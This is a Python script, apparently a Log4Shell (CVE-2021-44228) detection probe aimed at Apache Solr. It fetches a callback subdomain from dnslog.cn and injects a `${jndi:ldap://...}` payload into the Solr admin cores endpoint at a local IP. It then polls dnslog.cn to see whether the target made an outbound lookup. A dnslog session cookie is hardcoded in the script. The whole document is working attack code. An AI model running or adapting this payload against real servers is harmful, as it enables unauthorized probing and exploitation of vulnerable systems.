import requests
import time
from bs4 import BeautifulSoup
import os
import logging
import random

od=os.getcwd()
headers = {
'Cookie': 'UM_distinctid=17d9ee9b99ad5-08c6a2266360e7-4c3f2779-1fa400-17d9ee9b99b2b1; CNZZDATA1278305074=259968647-1640606623-%7C1643011913; PHPSESSID=kolveuasn829nk9s0jfffjg4n2'
}
def acd():
    global headers
    try:
        url3='http://dnslog.cn/getdomain.php'
        logging.captureWarnings(True)
        aa = requests.get(url3,headers=headers, verify=False,timeout=5)
        aa.encoding = 'utf-8'
        cd = BeautifulSoup(aa.text, 'html.parser')
        return cd
    except:
        ch='[-]调用dnslog错误 1 \n'
        return ch
def a():
    global ch
    url2='http://192.168.1.5:8983/solr/admin/cores?action=${jndi:ldap://'+str(acd())+'}'
    print(url2)
    try:
        proxies = {'http': None, 'https': None}
        logging.captureWarnings(True)
        aa = requests.get(url2, proxies=proxies, verify=False,timeout=5)
        aa.encoding = 'utf-8'
        print('1')
    except Exception as aaa:
        ch='[-]请求错误\n'+str(aaa)
a()
def bcd():
    global headers
    try:
        for i in range(0, 10):
            refresh = requests.get(url='http://dnslog.cn/getrecords.php', headers=headers, timeout=60)
            time.sleep(1)
            print(refresh.text)
    except EnvironmentError as aa:
        ch='[-]调用dnslog错误 2 \n'
        print(aa)
bcd()